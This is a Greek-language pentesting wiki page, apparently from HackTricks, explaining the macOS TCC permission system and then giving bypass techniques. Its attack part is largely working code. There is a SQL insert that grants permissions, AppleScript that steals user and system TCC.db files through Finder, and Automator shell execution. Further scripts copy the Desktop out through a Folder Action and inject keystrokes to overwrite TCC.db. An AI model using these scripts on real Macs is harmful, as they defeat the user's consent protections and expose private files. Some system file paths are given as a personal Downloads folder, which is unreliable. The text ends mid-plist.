# macOS TCC

<details>

<summary><strong>Μάθετε το χάκινγκ AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

## **Βασικές Πληροφορίες**

Το **TCC (Transparency, Consent, and Control)** είναι ένα πρωτόκολλο ασφαλείας που επικεντρώνεται στον έλεγχο των δικαιωμάτων εφαρμογών. Ο βασικός του ρόλος είναι να προστατεύει ευαίσθητα χαρακτηριστικά όπως **υπηρεσίες τοποθεσίας, επαφές, φωτογραφίες, μικρόφωνο, κάμερα, προσβασιμότητα και πλήρη πρόσβαση στο δίσκο**. Με την υποχρέωση ρητής συγκατάθεσης του χρήστη πριν χορηγηθεί πρόσβαση στις εφαρμογές σε αυτά τα στοιχεία, το TCC βελτιώνει την ιδιωτικότητα και τον έλεγχο του χρήστη επί των δεδομένων του.

Οι χρήστες αντιμετωπίζουν το TCC όταν οι εφαρμογές ζητούν πρόσβαση σε προστατευμένα χαρακτηριστικά. Αυτό είναι ορατό μέσω μιας προτροπής που επιτρέπει στους χρήστες να **εγκρίνουν ή να αρνηθούν την πρόσβαση**. Επιπλέον, το TCC προσαρμόζεται σε άμεσες ενέργειες του χρήστη, όπως το **σύρσιμο και απόθεση αρχείων σε μια εφαρμογή**, για να χορηγήσει πρόσβαση σε συγκεκριμένα αρχεία, εξασφαλίζοντας ότι οι εφαρμογές έχουν πρόσβαση μόνο σε αυτό που είναι ρητά επιτρεπόμενο.

![Ένα παράδειγμα προτροπής TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

Το **TCC** χειρίζεται από το **daemon** που βρίσκεται στο `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` και ρυθμίζεται στο `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (καταχωρίζοντας την υπηρεσία mach `com.apple.tccd.system`).

Υπάρχει ένα **tccd χρήστη σε λειτουργία χρήστη** που τρέχει ανά εισαγωγή χρήστη που ορίζεται στο `/System/Library/LaunchAgents/com.apple.tccd.plist` καταχωρίζοντας τις υπηρεσίες mach `com.apple.tccd` και `com.apple.usernotifications.delegate.com.apple.tccd`.

Εδώ μπορείτε να δείτε το tccd να τρέχει ως σύστημα και ως χρήστη:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Οι άδειες κληρονομούνται από τη γονική εφαρμογή και τα δικαιώματα παρακολουθούνται με βάση το Bundle ID και το Developer ID.

### Βάσεις δεδομένων TCC

Οι επιτροπές/απορρίψεις αποθηκεύονται σε ορισμένες βάσεις δεδομένων TCC:

- Η βάση δεδομένων σε επίπεδο συστήματος στο **`/Library/Application Support/com.apple.TCC/TCC.db`**.
- Αυτή η βάση δεδομένων προστατεύεται από το SIP, έτσι μόνο μια παράκαμψη SIP μπορεί να γράψει σε αυτήν.
- Η βάση δεδομένων TCC του χρήστη **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** για προτιμήσεις ανά χρήστη.
- Αυτή η βάση δεδομένων προστατεύεται, έτσι μόνο διεργασίες με υψηλά προνόμια TCC όπως Πλήρης Πρόσβαση Δίσκου μπορούν να γράψουν σε αυτήν (αλλά δεν προστατεύεται από το SIP).

{% hint style="warning" %}
Οι προηγούμενες βάσεις δεδομένων είναι επίσης προστατευμένες από το TCC για πρόσβαση ανάγνωσης. Έτσι δεν θα μπορείτε να διαβάσετε την κανονική βάση δεδομένων TCC του χρήστη σας εκτός αν είναι από μια διεργασία με προνόμια TCC.

Ωστόσο, θυμηθείτε ότι μια διεργασία με αυτά τα υψηλά προνόμια (όπως Πλήρης Πρόσβαση Δίσκου ή `kTCCServiceEndpointSecurityClient`) θα μπορεί να γράψει στη βάση δεδομένων TCC των χρηστών
{% endhint %}

- Υπάρχει μια τρίτη βάση δεδομένων TCC στο **`/var/db/locationd/clients.plist`** για να υποδεικνύει πελάτες που επιτρέπεται να έχουν πρόσβαση στις υπηρεσίες τοποθεσίας.
- Το προστατευμένο αρχείο από SIP **`/Users/carlospolop/Downloads/REG.db`** (επίσης προστατευμένο από πρόσβαση ανάγνωσης με TCC), περιέχει την τοποθεσία όλων των έγκυρων βάσεων δεδομένων TCC.
- Το προστατευμένο αρχείο από SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (επίσης προστατευμένο από πρόσβαση ανάγνωσης με TCC), περιέχει περισσότερες παραχωρημένες άδειες TCC.
- Το προστατευμένο αρχείο από SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (αλλά αναγνώσιμο από οποιονδήποτε) είναι μια λίστα εφαρμογών που απαιτούν μια εξαίρεση TCC.

{% hint style="success" %}
Η βάση δεδομένων TCC στο **iOS** βρίσκεται στο **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
Η **διεπαφή του κέντρου ειδοποιήσεων** μπορεί να πραγματοποιήσει **αλλαγές στη βάση δεδομένων TCC του συστήματος**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Ωστόσο, οι χρήστες μπορούν **να διαγράψουν ή να ερωτήσουν κανόνες** με το εργαλείο γραμμής εντολών **`tccutil`**.
{% endhint %}

#### Ερώτηση των βάσεων δεδομένων

{% tabs %}
{% tab title="βάση δεδομένων χρήστη" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="Σύστημα βάσης δεδομένων" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Ελέγχοντας και τις δύο βάσεις δεδομένων μπορείτε να ελέγξετε τις άδειες που έχει επιτρέψει μια εφαρμογή, έχει απαγορεύσει ή δεν έχει (θα ζητήσει άδεια).
{% endhint %}

* Το **`service`** είναι η συμβολοσειρά άδειας TCC
* Ο **`client`** είναι το **ID πακέτου** ή η **διαδρομή προς το δυαδικό** με τις άδειες
* Το **`client_type`** υποδεικνύει εάν πρόκειται για Αναγνωριστικό Πακέτου(0) ή απόλυτη διαδρομή(1)

<details>

<summary>Πώς να εκτελέσετε αν είναι απόλυτη διαδρομή</summary>

Απλά κάντε **`launctl load you_bin.plist`**, με ένα plist όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* Η **`auth_value`** μπορεί να έχει διαφορετικές τιμές: denied(0), unknown(1), allowed(2), ή limited(3).
* Το πεδίο **`auth_reason`** μπορεί να πάρει τις ακόλουθες τιμές: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Το πεδίο **csreq** υπάρχει για να υποδείξει πώς να επαληθευθεί το δυαδικό αρχείο που θα εκτελεστεί και να χορηγήσει τις άδειες TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Για περισσότερες πληροφορίες σχετικά με τα **άλλα πεδία** του πίνακα [**ελέγξτε αυτήν την ανάρτηση στο blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

Μπορείτε επίσης να ελέγξετε τις **άδειες που έχουν δοθεί ήδη** σε εφαρμογές στο `Προτιμήσεις Συστήματος --> Ασφάλεια & Απορρήτου --> Απορρήτου --> Αρχεία και Φάκελοι`.

{% hint style="success" %}
Οι χρήστες _μπορούν_ **να διαγράψουν ή να ερωτήσουν κανόνες** χρησιμοποιώντας το **`tccutil`**.
{% endhint %}

#### Επαναφορά δικαιωμάτων TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### TCC Έλεγχοι Υπογραφής

Η **βάση δεδομένων** του TCC αποθηκεύει το **Bundle ID** της εφαρμογής, αλλά αποθηκεύει επίσης **πληροφορίες** σχετικά με τη **υπογραφή** για να **διασφαλίσει** ότι η εφαρμογή που ζητάει άδεια είναι η σωστή.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Συνεπώς, άλλες εφαρμογές που χρησιμοποιούν το ίδιο όνομα και το αναγνωριστικό δέσμης (bundle ID) δεν θα μπορούν να έχουν πρόσβαση στις άδειες που έχουν δοθεί σε άλλες εφαρμογές.
{% endhint %}

### Δικαιώματα & Άδειες TCC

Οι εφαρμογές **δεν χρειάζεται μόνο** να **ζητήσουν** και να έχουν **παραχωρηθεί πρόσβαση** σε κάποιους πόρους, πρέπει επίσης να **έχουν τα σχετικά δικαιώματα**.\
Για παράδειγμα, το **Telegram** έχει το δικαίωμα `com.apple.security.device.camera` για να ζητήσει **πρόσβαση στην κάμερα**. Μια **εφαρμογή** που **δεν έχει** αυτό το **δικαίωμα δεν θα μπορεί** να έχει πρόσβαση στην κάμερα (και ο χρήστης δεν θα ρωτηθεί καν για τις άδειες).

Ωστόσο, για τις εφαρμογές να **έχουν πρόσβαση** σε **συγκεκριμένους φακέλους χρήστη**, όπως `~/Desktop`, `~/Downloads` και `~/Documents`, **δεν χρειάζεται** να έχουν κάποια συγκεκριμένα **δικαιώματα.** Το σύστημα θα χειριστεί διαφανώς την πρόσβαση και θα **ζητήσει την έγκριση του χρήστη** όπως απαιτείται.

Οι εφαρμογές της Apple **δεν θα παράγουν παράθυρα ενημέρωσης**. Περιέχουν **προκαθορισμένα δικαιώματα** στη λίστα των **δικαιωμάτων τους**, που σημαίνει ότι **ποτέ δεν θα δημιουργήσουν ένα αναδυόμενο παράθυρο**, **ούτε** θα εμφανιστούν σε κάποια από τις **βάσεις δεδομένων TCC.** Για παράδειγμα:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Αυτό θα αποτρέψει το Ημερολόγιο να ζητήσει από τον χρήστη πρόσβαση σε υπενθυμίσεις, ημερολόγιο και βιβλίο διευθύνσεων.

{% hint style="success" %}
Εκτός από ορισμένα επίσημα έγγραφα σχετικά με τις εξουσιοδοτήσεις, είναι επίσης δυνατό να βρείτε μη επίσημες **ενδιαφέρουσες πληροφορίες σχετικά με τις εξουσιοδοτήσεις** στο [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Κάποιες άδειες TCC είναι: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Δεν υπάρχει δημόσια λίστα που ορίζει όλες αυτές, αλλά μπορείτε να ελέγξετε αυτήν την [**λίστα των γνωστών**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Ευαίσθητοι μη προστατευμένοι τόποι

* $HOME (αυτό καθαυτό)
* $HOME/.ssh, $HOME/.aws, κλπ
* /tmp

### Πρόθεση Χρήστη / com.apple.macl

Όπως αναφέρθηκε προηγουμένως, είναι δυνατόν να **χορηγήσετε πρόσβαση σε μια εφαρμογή σε ένα αρχείο σύροντάς το πάνω της**. Αυτή η πρόσβαση δεν θα καθορίζεται σε καμία βάση δεδομένων TCC αλλά ως **επεκταμένο** **χαρακτηριστικό του αρχείου**. Αυτό το χαρακτηριστικό θα **αποθηκεύει το UUID** της επιτρεπόμενης εφαρμογής:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Είναι περίεργο ότι το χαρακτηριστικό **`com.apple.macl`** διαχειρίζεται από το **Sandbox**, όχι από το tccd.

Επίσης, σημειώστε ότι εάν μετακινήσετε ένα αρχείο που επιτρέπει το UUID μιας εφαρμογής στον υπολογιστή σας σε διαφορετικό υπολογιστή, επειδή οι ίδιες εφαρμογές θα έχουν διαφορετικά UIDs, δεν θα παραχωρήσει πρόσβαση σε αυτήν την εφαρμογή.
{% endhint %}

Το επεκτεινόμενο χαρακτηριστικό `com.apple.macl` **δεν μπορεί να εκκαθαριστεί** όπως τα άλλα επεκτεινόμενα χαρακτηριστικά επειδή προστατεύεται από το SIP. Ωστόσο, όπως [**εξηγείται σε αυτήν την ανάρτηση**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), είναι δυνατόν να το απενεργοποιήσετε **συμπιέζοντας** το αρχείο, **διαγράφοντάς** το και **αποσυμπιέζοντάς** το.

## TCC Ανύψωση Προνομίων & Παρακάμψεις

### Εισαγωγή στο TCC

Εάν κάποια στιγμή καταφέρετε να αποκτήσετε δικαιώματα εγγραφής σε μια βάση δεδομένων TCC, μπορείτε να χρησιμοποιήσετε κάτι παρόμοιο με το παρακάτω για να προσθέσετε μια καταχώρηση (αφαιρέστε τα σχόλια):

<details>

<summary>Παράδειγμα Εισαγωγής στο TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### TCC Payloads

Εάν καταφέρετε να μπείτε σε μια εφαρμογή με κάποιες άδειες TCC, ελέγξτε την παρακάτω σελίδα με payloads TCC για να τα εκμεταλλευτείτε:

{% content-ref url="macos-tcc-payloads.md" %}
[macos-tcc-payloads.md](macos-tcc-payloads.md)
{% endcontent-ref %}

### Αυτοματισμός (Finder) προς FDA\*

Το όνομα TCC της άδειας Αυτοματισμού είναι: **`kTCCServiceAppleEvents`**\
Αυτή η συγκεκριμένη άδεια TCC υποδεικνύει επίσης την **εφαρμογή που μπορεί να διαχειριστεί** μέσα στη βάση δεδομένων TCC (έτσι οι άδειες δεν επιτρέπουν απλώς να διαχειριστείτε τα πάντα).

Ο **Finder** είναι μια εφαρμογή που **έχει πάντα FDA** (ακόμα κι αν δεν εμφανίζεται στο UI), οπότε αν έχετε **προνόμια Αυτοματισμού** πάνω σε αυτόν, μπορείτε να εκμεταλλευτείτε τα προνόμιά του για να **εκτελέσετε κάποιες ενέργειες**.\
Σε αυτήν την περίπτωση, η εφαρμογή σας θα χρειαζόταν την άδεια **`kTCCServiceAppleEvents`** πάνω στο **`com.apple.Finder`**.

{% tabs %}
{% tab title="Κλέψτε το TCC.db των χρηστών" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}

{% tab title="Κλέψτε το TCC.db του συστήματος" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias
duplicate file sourceFile to targetFolder with replacing
end tell
EOD
```
{% endtab %}
{% endtabs %}

Μπορείτε να καταχραστείτε αυτό για **να γράψετε τη δική σας βάση δεδομένων χρήστη TCC**.

{% hint style="warning" %}
Με αυτήν την άδεια θα μπορείτε **να ζητήσετε από το Finder να έχετε πρόσβαση σε περιορισμένους φακέλους TCC** και να σας δώσει τα αρχεία, αλλά όσο γνωρίζω δεν θα μπορείτε **να κάνετε το Finder να εκτελέσει αυθαίρετο κώδικα** για να εκμεταλλευτείτε πλήρως την πρόσβασή του στο FDA.

Συνεπώς, δεν θα μπορείτε να εκμεταλλευτείτε πλήρως τις ικανότητες του FDA.
{% endhint %}

Αυτή είναι η πρόταση TCC για να λάβετε προνόμια Αυτοματισμού πάνω στο Finder:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Σημειώστε ότι επειδή η εφαρμογή **Automator** έχει την άδεια TCC **`kTCCServiceAppleEvents`**, μπορεί **να ελέγχει οποιαδήποτε εφαρμογή**, όπως το Finder. Έτσι, έχοντας την άδεια να ελέγχετε το Automator, θα μπορούσατε επίσης να ελέγχετε το **Finder** με έναν κώδικα όπως ο παρακάτω:
{% endhint %}

<details>

<summary>Λάβετε ένα κέλυφος μέσα στο Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Το ίδιο συμβαίνει και με την εφαρμογή **Script Editor,** μπορεί να ελέγχει το Finder, αλλά χρησιμοποιώντας ένα AppleScript δεν μπορείτε να τον αναγκάσετε να εκτελέσει ένα σενάριο.

### Αυτοματισμός (SE) προς ορισμένα TCC

**Το System Events μπορεί να δημιουργήσει Folder Actions, και τα Folder actions μπορούν να έχουν πρόσβαση σε ορισμένους φακέλους TCC** (Desktop, Documents & Downloads), έτσι ένα σενάριο όπως το παρακάτω μπορεί να χρησιμοποιηθεί για να εκμεταλλευτεί αυτήν τη συμπεριφορά:
```bash
# Create script to execute with the action
cat > "/tmp/script.js" <<EOD
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("cp -r $HOME/Desktop /tmp/desktop");
EOD

osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"

# Create folder action with System Events in "$HOME/Desktop"
osascript <<EOD
tell application "System Events"
-- Ensure Folder Actions are enabled
set folder actions enabled to true

-- Define the path to the folder and the script
set homeFolder to path to home folder as text
set folderPath to homeFolder & "Desktop"
set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"

-- Create or get the Folder Action for the Desktop
if not (exists folder action folderPath) then
make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
end if
set myFolderAction to folder action folderPath

-- Attach the script to the Folder Action
if not (exists script scriptPath of myFolderAction) then
make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
end if

-- Enable the Folder Action and the script
enable myFolderAction
end tell
EOD

# File operations in the folder should trigger the Folder Action
touch "$HOME/Desktop/file"
rm "$HOME/Desktop/file"
```
### Αυτοματισμός (SE) + Προσβασιμότητα (**`kTCCServicePostEvent`|**`kTCCServiceAccessibility`**)** στο FDA\*

Ο Αυτοματισμός στο **`System Events`** + Προσβασιμότητα (**`kTCCServicePostEvent`**) επιτρέπει την αποστολή **πληκτρολογίων σε διεργασίες**. Με αυτόν τον τρόπο μπορείτε να καταχραστείτε το Finder για να αλλάξετε τη βάση δεδομένων TCC των χρηστών ή να δώσετε FDA σε οποιαδήποτε εφαρμογή (αν και μπορεί να ζητηθεί κωδικός πρόσβασης γι' αυτό).

Παράδειγμα αντικατάστασης του Finder με τη βάση δεδομένων TCC των χρηστών:
```applescript
-- store the TCC.db file to copy in /tmp
osascript <<EOF
tell application "System Events"
-- Open Finder
tell application "Finder" to activate

-- Open the /tmp directory
keystroke "g" using {command down, shift down}
delay 1
keystroke "/tmp"
delay 1
keystroke return
delay 1

-- Select and copy the file
keystroke "TCC.db"
delay 1
keystroke "c" using {command down}
delay 1

-- Resolve $HOME environment variable
set homePath to system attribute "HOME"

-- Navigate to the Desktop directory under $HOME
keystroke "g" using {command down, shift down}
delay 1
keystroke homePath & "/Library/Application Support/com.apple.TCC"
delay 1
keystroke return
delay 1

-- Check if the file exists in the destination and delete if it does (need to send keystorke code: https://macbiblioblog.blogspot.com/2014/12/key-codes-for-function-and-special-keys.html)
keystroke "TCC.db"
delay 1
keystroke return
delay 1
key code 51 using {command down}
delay 1

-- Paste the file
keystroke "v" using {command down}
end tell
EOF
```
### `kTCCServiceAccessibility` σε FDA\*

Ελέγξτε αυτήν τη σελίδα για μερικά [**payloads για κατάχρηση των δικαιωμάτων πρόσβασης**](macos-tcc-payloads.md#accessibility) για προώθηση σε FDA\* ή εκτέλεση ενός keylogger για παράδειγμα.

### **Πελάτης Ασφάλειας Σημείου Πρόσβασης σε FDA**

Αν έχετε **`kTCCServiceEndpointSecurityClient`**, έχετε FDA. Τέλος.

### Αρχείο Συστήματος Πολιτικής Διαχειριστή Αρχείων σε FDA

Το **`kTCCServiceSystemPolicySysAdminFiles`** επιτρέπει τη **τροποποίηση** του χαρακτηριστικού **`NFSHomeDirectory`** ενός χρήστη που αλλάζει τον φάκελο του αρχικού φακέλου και επομένως επιτρέπει τη **παράκαμψη του TCC**.

### Βάση Δεδομένων TCC Χρήστη σε FDA

Με την απόκτηση **δικαιωμάτων εγγραφής** στη **βάση δεδομένων TCC** του χρήστη δεν μπορείτε να χορηγήσετε στον εαυτό σας δικαιώματα **`FDA`**, μόνο αυτός που βρίσκεται στη βάση δεδομένων του συστήματος μπορεί να τα χορηγήσει.

Ωστόσο, μπορείτε να δώσετε στον εαυτό σας **`Δικαιώματα Αυτοματισμού στο Finder`**, και να καταχραστείτε την προηγούμενη τεχνική για προώθηση σε FDA\*.

### **Δικαιώματα FDA σε TCC**

Η πρόσβαση **Πλήρους Δίσκου** στο TCC ονομάζεται **`kTCCServiceSystemPolicyAllFiles`**

Δεν νομίζω ότι αυτό είναι ένα πραγματικό προνόμιο προώθησης, αλλά για περίπτωση που μπορεί να σας φανεί χρήσιμο: Αν ελέγχετε ένα πρόγραμμα με FDA μπορείτε να **τροποποιήσετε τη βάση δεδομένων TCC των χρηστών και να δώσετε στον εαυτό σας οποιαδήποτε πρόσβαση**. Αυτό μπορεί να είναι χρήσιμο ως τεχνική διατήρησης σε περίπτωση που χάσετε τα δικαιώματά σας FDA.

### **Παράκαμψη SIP σε Παράκαμψη TCC**

Η βάση δεδομένων TCC του συστήματος προστατεύεται από το **SIP**, γι' αυτό μόνο διεργασίες με τα **συγκεκριμένα δικαιώματα θα μπορούν να την τροποποιήσουν**. Επομένως, αν ένας επιτιθέμενος βρει μια **παράκαμψη SIP** σε ένα **αρχείο** (να μπορεί να το τροποποιήσει παρά το SIP), θα μπορεί:

* Να **αφαιρέσει την προστασία** μιας βάσης δεδομένων TCC και να δώσει στον εαυτό του όλα τα δικαιώματα TCC. Θα μπορούσε να καταχραστεί οποιοδήποτε από αυτά τα αρχεία για παράδειγμα:
* Η βάση δεδομένων συστήματος TCC
* REG.db
* MDMOverrides.plist

Ωστόσο, υπάρχει μια άλλη επιλογή για κατάχρηση αυτής της **παράκαμψης SIP για παράκαμψη TCC**, το αρχείο `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` είναι μια λίστα εφαρμογών που απαιτούν μια εξαίρεση TCC. Επομένως, αν ένας επιτιθέμενος μπορεί να **αφαιρέσει την προστασία SIP** από αυτό το αρχείο και να προσθέσει την **δική του εφαρμογή**, η εφαρμογή θα μπορεί να παρακάμψει το TCC.\
Για παράδειγμα για να προσθέσετε το terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
```plaintext
Αρχείο AllowApplicationsList.plist:
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
